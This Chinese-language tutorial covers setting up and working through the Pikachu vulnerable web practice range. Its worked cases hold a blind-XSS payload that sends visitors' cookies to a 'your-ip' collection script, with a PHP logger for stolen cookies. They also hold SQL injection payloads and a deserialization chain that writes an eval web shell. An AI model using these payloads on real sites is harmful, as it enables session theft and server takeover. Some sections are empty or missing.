## 二、环境搭建

### 2.1 方式一：Docker 部署（推荐）

```bash
# 拉取镜像
docker pull area39/pikachu

# 启动容器
docker run -d -p 80:80 --name pikachu area39/pikachu
```

访问 `http://localhost`，首次访问点击"安装/初始化"按钮即可自动创建数据库。

默认管理员账号：
- 用户名：`admin`
- 密码：`123456`

> 注意：不同镜像的默认账号可能不同，以实际页面提示为准。

### 2.2 方式二：Docker Compose 部署

创建 `docker-compose.yml`：

```yaml
version: '3'
services:
  pikachu:
    image: area39/pikachu
    ports:
      - "80:80"
    restart: always
```

启动：
```bash
docker-compose up -d
```

### 2.3 方式三：手动部署

```bash
# 下载源码
git clone https://github.com/zhuifengshaonianhanlu/pikachu.git
cd pikachu

# 配置数据库连接
cp inc/config.inc.php.bak inc/config.inc.php
# 编辑 inc/config.php，修改数据库连接信息

# 将项目放到 Web 目录
cp -r . /var/www/html/pikachu/
```

然后访问 `http://localhost/pikachu/install.php` 进行安装。

登录 Pikachu 后，首页以卡片形式展示所有漏洞模块：

## 三、模块介绍

> 💡 **大白话说Pikachu的模块结构——"从客厅到阁楼，一层一层探索"**
>
> Pikachu的模块看似很多（15+），但它们的排列是有规律的——**从最简单到最复杂，从最常见的漏洞到更高级的攻击**。
>
> 想象你在探索一栋房子：
> - **一楼客厅**（暴力破解、XSS、SQL注入）：最常见的漏洞，你进门就能看到
> - **二楼卧室**（RCE、文件包含、文件上传）：需要你有一些基础才能利用的漏洞
> - **三楼书房**（CSRF、越权、SSRF）：需要理解"身份"和"信任"的概念
> - **地下室/阁楼**（反序列化、XXE）：最复杂的攻击方式，需要深入理解编程语言的内部机制
>
> 建议按这个顺序打，千万不要跳过一楼直接去阁楼——就像你不会跳过加减法直接学微积分。
>
> **Pikachu最大的特色是包含了几个国产靶场特有的漏洞类型**：
> - 宽字节注入——这是中文网站特有的问题，因为GBK编码在国外基本不用
> - 验证码绕过——国内网站的验证码设计经常有安全漏洞
> - XSS盲打——模拟了管理员后台查看用户提交内容的真实场景
>
> 这些都是在英文靶场里很难遇到的"中国特色"漏洞。

Pikachu 包含以下主要模块，覆盖了 Web 安全的各个方面。

### 3.1 暴力破解（Brute Force）

**简介**：通过大量尝试来猜测用户名和密码的攻击方式。

**包含子模块**：
- **基于表单的暴力破解**：最基础的登录表单爆破
- **验证码绕过（on server）**：服务端验证码可复用的问题
- **验证码绕过（on client）**：前端验证码的绕过
- **token 防爆破**：token 机制下的暴力破解

**学习要点**：
- Burp Suite Intruder 的使用
- 验证码安全问题
- Token 机制的绕过

### 3.2 XSS（跨站脚本）

**简介**：恶意脚本被注入到网页中，在用户浏览器中执行。

**包含子模块**：
- **反射型 XSS（get/post）**：最基础的 XSS
- **存储型 XSS**：恶意代码存储在数据库中
- **DOM 型 XSS**：前端 JS 导致的 XSS
- **XSS 盲打**：提交的内容在后台管理页面触发

**学习要点**：
- 三种 XSS 的区别与利用
- XSS 盲打的原理与利用场景
- XSS 获取 Cookie、钓鱼等利用方式

### 3.3 SQL 注入

**简介**：用户输入被拼接到 SQL 语句中执行，导致数据库信息泄露。

**包含子模块**：
- **数字型注入（post）**：通过 POST 参数的数字型注入
- **字符型注入（get）**：通过 GET 参数的字符型注入
- **搜索型注入**：搜索功能中的注入
- **XXE 注入**：XML 外部实体注入
- **insert/update 注入**：数据插入/更新时的注入
- **delete 注入**：删除操作中的注入
- **http头注入**：User-Agent、Referer 等头注入
- **布尔盲注**：通过页面真假判断数据
- **时间盲注**：通过时间延迟判断数据
- **宽字节注入**：利用字符编码差异的注入

**学习要点**：
- 各种场景下的 SQL 注入
- 盲注的原理与技巧
- 宽字节注入的原理
- SQLMap 工具的使用

### 3.4 RCE（远程命令/代码执行）

**简介**：攻击者可以在服务器上执行系统命令或代码。

**包含子模块**：
- **exec "ping"**：命令执行，ping 功能
- **eval**：代码执行，eval 函数

**学习要点**：
- 命令执行与代码执行的区别
- 命令连接符的使用（`;`、`&&`、`|`、`||`）
- 常见危险函数

### 3.5 文件包含（File Inclusion）

**简介**：应用程序包含文件时，文件路径可控导致的漏洞。

**包含子模块**：
- **本地文件包含（LFI）**：包含服务器本地文件
- **远程文件包含（RFI）**：包含远程服务器上的文件

**学习要点**：
- PHP 文件包含函数（include、require 等）
- 本地文件包含读取敏感文件
- 远程文件包含 GetShell
- PHP 封装协议的利用（php://、data:// 等）

### 3.6 不安全的文件下载

**简介**：下载功能的文件路径参数可控，导致可以下载任意文件。

**学习要点**：
- 目录遍历（`../`）的利用
- 下载配置文件、源代码等敏感文件

### 3.7 不安全的文件上传

**简介**：文件上传功能校验不严，导致可以上传恶意文件。

**学习要点**：
- 前端校验绕过
- MIME 类型校验绕过
- 文件头校验绕过
- 黑名单绕过
- .htaccess 利用
- 解析漏洞利用

### 3.8 越权（Over Permission）

**简介**：访问控制不严，导致用户可以访问超出权限的资源。

> 💡 **大白话说越权——"宿舍楼门禁卡错了"**
>
> 越权漏洞的本质是**"身份检查"没有做好**。用大学宿舍来理解：
>
> **水平越权 = 你的门禁卡能开同楼层其他宿舍的门**
> - 你是202宿舍的学生，你的卡应该只能开202的门
> - 但你发现把卡上的宿舍号从202改成203 → 你就能开203的门了
> - 你和其他宿舍的学生是"同级别"的（都是普通学生），但你访问了同级别人的东西
> - 在Web中：你把URL里的 `?username=lucy` 改成 `?username=kobe`，就看到了kobe的资料
>
> **垂直越权 = 你的学生卡能进教师办公室**
> - 你是一个普通学生，按理说只能进宿舍楼
> - 但你发现你的卡刷教师办公室的门禁也能开 → 你获得了你本不该有的权限
> - 在Web中：你用一个普通用户的Cookie，去访问管理员才能访问的URL（比如 `/admin/add_user`），结果居然能成功
>
> **越权和SQL注入/XSS的最大区别**：越权不需要任何"攻击技术"，你只是**正常访问，但是访问了不该你访问的东西**。它考验的不是你的攻击能力，而是开发者有没有做好每个接口的权限检查。
>
> 一个简单的测试方法：**用两个浏览器（或用隐私模式）同时登录两个不同权限的账号，用低权限账号的Cookie去访问高权限的接口**。如果成功了，就是垂直越权。

**包含子模块**：
- **水平越权**：同级别用户之间的越权访问
- **垂直越权**：低权限用户访问高权限功能

**学习要点**：
- 水平越权与垂直越权的区别
- IDOR（不安全的直接对象引用）
- 权限控制的常见缺陷

### 3.9 目录遍历

**简介**：通过构造特殊路径，访问 Web 根目录以外的文件。

**学习要点**：
- `../` 目录遍历符的利用
- 各种编码绕过
- 读取系统敏感文件

### 3.10 敏感信息泄露

**简介**：应用程序泄露了不应公开的敏感信息。

**包含场景**：
- 目录扫描发现敏感文件
- 错误信息泄露
- 备份文件泄露
- PHP 探针页面
- 测试页面泄露

**学习要点**：
- 常见敏感文件路径
- 信息收集的方法
- 目录扫描工具的使用

### 3.11 PHP 反序列化

**简介**：PHP 反序列化用户可控的数据，导致对象注入攻击。

**学习要点**：
- PHP 序列化与反序列化
- 魔术方法（`__wakeup`、`__destruct` 等）
- POP 链的构造
- 反序列化 GetShell

### 3.12 XXE（XML 外部实体注入）

**简介**：XML 解析器加载外部实体，导致文件读取、SSRF 等问题。

**学习要点**：
- XML 实体的概念
- 外部实体注入的原理
- 读取本地文件
- SSRF 利用

### 3.13 SSRF（服务端请求伪造）

**简介**：服务器端发起请求的地址可控，导致内网探测等攻击。

**包含子模块**：
- **SSRF（curl 方式）**：基于 curl 的 SSRF

**学习要点**：
- SSRF 的原理与危害

### 3.14 CSRF（跨站请求伪造）

**简介**：诱导已登录用户执行非预期操作。

**包含子模块**：

**学习要点**：

## 五、实战案例

### 案例 1：XSS 盲打实战 —— 后台管理员中招

**场景**：Pikachu 的 XSS 盲打模块，用户提交的留言会在后台管理页面显示，但我们无法直接看到效果。

**原理**：XSS 盲打的特点是我们不知道 Payload 在哪里触发、什么时候触发，需要通过外带数据的方式来验证。

> 💡 **大白话说XSS盲打——"在别人家里装了个监控，但你看不到监控画面"**
>
> 普通的XSS是你直接在当前页面看到效果——弹个窗、跳转一下。但盲打完全不同：
> - 你把恶意代码写在留言板上
> - 管理员在后台查看时，代码才被执行
> - **你看不到管理员的屏幕**——你不知道代码有没有执行、什么时候执行
>
> 这就像你在一个房间里放了一个录音笔（盲打代码），但你自己不能进那个房间。你怎么知道录音笔是否在工作？
>
> 答案是：**让录音笔主动联系你**。录音笔每录到声音就自动发短信给你——这就是"外带数据"的核心思路。
>
> 在XSS盲打中，你的代码会：
> 1. 读取当前页面的敏感信息（Cookie、页面内容）
> 2. 用 `<img>` 标签或者 `fetch` 请求把这些信息发到你控制的服务器
> 3. 你就能看到"管理员在什么时候、什么页面触发了XSS，他的Cookie是什么"
>
> 这就是为什么盲打技术比普通XSS更"实战"——真实渗透中，大部分有价值的目标都是盲打的。

**步骤**：

1. **准备外带平台**

可以使用以下方式接收数据：
- XSS 平台（如 xss.pt、xss.la 等在线平台）
- 自己搭建一个接收脚本
- 使用 Beeceptor / RequestBin 等在线请求接收服务

**自建接收脚本（get_cookie.php）**：
```php
<?php
$cookie = $_GET['cookie'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$content = "IP: $ip | Time: $time | Cookie: $cookie\n";
file_put_contents('cookie.txt', $content, FILE_APPEND);
?>
```

2. **构造 Payload**

在留言框中提交：
```html
<script>
  var img = new Image();
  img.src = 'http://your-ip/get_cookie.php?cookie=' + document.cookie;
</script>
```

或更隐蔽的方式：
```html
<img src=x onerror="this.src='http://your-ip/get_cookie.php?c='+document.cookie">
```

3. **等待管理员访问**

提交后，我们无法直接看到效果。但可以模拟管理员登录后台查看留言：
- 访问后台管理页面（通常需要管理员账号）
- 查看留言列表
- 观察接收脚本的 cookie.txt 文件

4. **利用获取的 Cookie**

获得管理员 Cookie 后，可以使用浏览器插件（如 EditThisCookie）替换 Cookie，然后直接以管理员身份登录后台。

### 案例 2：SQL 注入通关 —— 从数字型到宽字节

**目标**：完成 Pikachu 中所有 SQL 注入模块的练习。

**2.1 数字型注入（POST）**

1. 抓包，找到 POST 参数 `id=1`
2. 修改为 `id=1 order by 2`，正常
3. 修改为 `id=1 order by 3`，报错 → 字段数为 2
4. `id=-1 union select 1,database()` → 获取库名
5. 继续获取表名、列名、数据

**2.2 字符型注入（GET）**

1. 输入 `'` 测试，报错
2. 输入 `x' union select 1,version()-- -`，获取版本
3. 逐步脱库

**2.3 搜索型注入**

1. 搜索框输入 `%' and 1=1#`，正常
2. 输入 `%' and 1=2#`，异常 → 存在注入
3. 用 UNION 查询获取数据

**2.4 布尔盲注**

```
# 判断库名长度
1' and length(database())>5#

# 逐字符猜解
1' and ascii(substr(database(),1,1))>97#
```

**2.5 时间盲注**

```
# 如果第一个字符是 p，延迟 5 秒
1' and if(ascii(substr(database(),1,1))=112,sleep(5),0)#
```

**2.6 宽字节注入**

**原理**：当数据库使用 GBK 编码时，`%df%27` 会被组合成一个汉字"運"，单引号逃逸。

> 💡 **大白话说宽字节注入——"GBK编码的'中文特供'漏洞"**
>
> 宽字节注入是中国网站特有的漏洞类型，国外靶场基本见不到。为什么？因为GBK编码基本只有中文网站用。
>
> 用"排队"来理解：
> - 正常的ASCII世界：1个格子放1个字符，`'`（单引号）占1个格子
> - GBK的世界：1个汉字占2个格子（所以叫"宽字节"），有些2格组合会被解释成汉字
> - 网站为了防止注入，在 `'` 前加一个 `\`（转义符），变成 `\'`（2个格子）
> - 但黑客在 `'` 前加 `%df`，组合成 `%df\'` → 这是"運"字！`\` 被吃掉了！
> - `'` 又变成了一个独立的、没被转义的单引号 → 注入成功
>
> 就像门卫在每个人进门之前都检查"有没有带危险品"。但GBK编码情况下，把两个人拼在一起就会变成"另一个人"——门卫看不过来。
>
> 只要数据库是GBK编码、PHP开启了魔术引号（magic_quotes_gpc），就可能有宽字节注入。修复方法很简单：使用UTF-8编码，或者使用参数化查询（PDO预处理）。

**Payload**：
```
id=1%df' union select 1,version()-- -
```

**2.7 SQLMap 自动化**

### 案例 4：PHP 反序列化利用 —— 构造 POP 链

**场景**：Pikachu 的 PHP 反序列化模块，存在一个反序列化点。

> 💡 **大白话说反序列化——"快递包裹被掉包了"**
>
> 反序列化是Web安全中最难的概念之一，但用"快递"来理解就简单了：
>
> **序列化** = 把一个对象（里面有各种属性和值）打包成一个字符串，像把货物装箱寄出去
> ```php
> // 打包前：一个对象 { test: "pikachu" }
> // 打包后：O:1:"S":1:{s:4:"test";s:7:"pikachu";}  ← 这就是序列化后的字符串
> ```
>
> **反序列化** = 收到箱子后拆箱，把字符串还原成对象
> ```php
> // 拆箱后：又变成了 { test: "pikachu" } 对象
> ```
>
> **漏洞出在哪？**
> 如果用户能控制"箱子里的内容"（序列化字符串），那他就可以把箱子里的货物（属性值）换成危险的东西。比如：
> - 原来箱子里是 `test: "pikachu"`
> - 黑客改成 `test: "phpinfo();"`
> - 拆箱后对象里的test就变成了 `phpinfo();`
> - 如果对象的 `__destruct()` 方法里执行了 `eval($this->test)` → 代码被执行！
>
> 这就是为什么反序列化漏洞这么严重：**你控制的不是表面数据，而是对象内部的逻辑跳板**。就像你递了一封"看起来很正常的信"给拆信人，但信的内容会让拆信人做一件危险的事。
>
> **POP链**（Property-Oriented Programming）就是"我需要控制哪几个对象的哪几个属性，让它们串联起来最终执行我的命令"。就像多米诺骨牌——推倒第一张，后面的自动倒，最后正好砸在目标按钮上。

**步骤**：

1. **分析源码**

查看页面源码，找到反序列化相关代码：

```php
class S{
    var $test = "pikachu";
    function __construct(){
        echo "construct run...";
    }
    function __destruct(){
        // echo $this->test;
        @eval($this->test);
    }
}
```

2. **构造 Payload**

`__destruct` 方法中调用了 `eval($this->test)`，我们可以控制 `$test` 的值来执行代码。

构造序列化字符串：
```php
<?php
class S{
    var $test = "phpinfo();";
}
$obj = new S();
echo serialize($obj);
// 输出：O:1:"S":1:{s:4:"test";s:10:"phpinfo();";}
?>
```

3. **提交利用**

将序列化字符串提交到反序列化接口，页面会执行 `phpinfo()`。

4. **进阶 GetShell**

```php
<?php
class S{
    var $test = 'file_put_contents("shell.php", "<?php eval(\$_REQUEST[cmd]); ?>");';
}
echo serialize(new S());
?>
```

提交后会在当前目录生成一句话木马 `shell.php`。
